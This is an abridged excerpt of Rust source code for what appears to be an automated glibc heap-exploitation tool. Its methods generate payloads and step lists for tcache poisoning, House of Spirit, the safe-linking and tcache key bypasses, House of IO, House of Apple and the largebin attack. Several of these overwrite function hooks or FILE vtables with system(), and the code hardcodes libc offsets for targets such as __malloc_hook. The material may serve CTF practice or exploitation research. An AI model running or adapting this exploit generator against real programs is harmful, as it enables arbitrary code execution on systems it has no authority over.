...
impl HeapExploit {
    ...
    pub fn tcache_poison(&self, target_addr: u64, size: usize) -> Vec<u8> {
        log::info!(
            "Generating tcache poisoning payload for 0x{:x}",
            target_addr
        );
    ...
    pub fn house_of_spirit(&self, fake_chunk_addr: u64, size: u64) -> Vec<u8> {
        log::info!(
            "Generating House of Spirit fake chunk at 0x{:x}",
            fake_chunk_addr
        );
...
impl ModernHeapExploit {
    pub fn new(binary: &str, glibc_version: GlibcVersion) -> Self {
        ...
        println!(
            "[HEAP]   Safe-linking: {}",
            glibc_version.has_safe_linking()
        );
    ...
    fn solve_tcache_safe_linking(&self) -> Result<HeapExploitResult, String> {
        ...
        let heap_base = self
            .heap_base
            .ok_or("Heap base required for safe-linking bypass")?;
        ...
        let steps = vec![
            ...
            format!(
                "3. Overflow to corrupt next pointer with mangled value: 0x{:016x}",
                mangled
            ),
    ...
    fn solve_tcache_key_bypass(&self) -> Result<HeapExploitResult, String> {
        ...
        let heap_base = self
            .heap_base
            .ok_or("Heap base required for tcache key bypass")?;
        let target_addr = self.get_target_address()?;
        ...
        let steps = vec![
            ...
            format!(
                "2. Calculate valid tcache key: chunk_addr ^ (tcache_perthread >> 12) = 0x{:016x}",
                key
            ),
            "3. Double-free chunk into tcache".to_string(),
            format!(
                "4. Overflow to overwrite next=0x{:016x}, key=0x{:016x}",
                mangled_next, key
            ),
    ...
    fn solve_house_of_io(&self) -> Result<HeapExploitResult, String> {
        ...
        let steps = vec![
            ...
            format!(
                "2. Overwrite _IO_list_all pointer to point at fake FILE (0x{:016x})",
                io_list_all
            ),
            ...
            format!(
                "6. Overwrite vtable pointer to controlled memory with system(): 0x{:016x}",
    ...
    fn solve_house_of_apple(&self) -> Result<HeapExploitResult, String> {
        ...
        let libc_base = self
            .libc_base
            .ok_or("Libc base required for House of Apple")?;
        let heap_base = self
            .heap_base
            .ok_or("Heap base required for House of Apple")?;
        ...
        let steps = vec![
            ...
            format!(
                "3. Set _IO_FILE._wide_data pointing to controlled heap chunk at 0x{:016x}",
                heap_base + 0x500
            ),
            "4. Craft fake _IO_wide_data structure".to_string(),
            format!(
                "5. Set _wide_data._wide_vtable pointing to fake vtable with system()@0x{:016x}",
                self.overwrite_value
            ),
    ...
    fn solve_largebin_attack(&self) -> Result<HeapExploitResult, String> {
        ...
        let heap_base = self
            .heap_base
            .ok_or("Heap base required for largebin attack")?;
        let target_addr = self.get_target_address()?;
        ...
        let steps = vec![
            ...
            format!(
                "4. Corrupt victim->bk_nextsize to (target - 0x20): 0x{:016x}",
                target_addr - 0x20
            ),
            "5. Trigger malloc() to move chunk from unsorted → largebin".to_string(),
            format!(
                "6. Largebin insertion writes victim address to target: 0x{:016x}",
                target_addr
            ),
        ];
    ...
    fn get_target_address(&self) -> Result<u64, String> {
        match &self.target {
            ...
            HeapTarget::MallocHook => {
                let libc_base = self
                    .libc_base
                    .ok_or("Libc base required for __malloc_hook")?;
                Ok(libc_base + 0x1eeb30)
            }
            HeapTarget::ReallocHook => {
                let libc_base = self
                    .libc_base
                    .ok_or("Libc base required for __realloc_hook")?;
                Ok(libc_base + 0x1eeb28)
            }
            HeapTarget::IOListAll => {
                let libc_base = self
                    .libc_base
                    .ok_or("Libc base required for _IO_list_all")?;
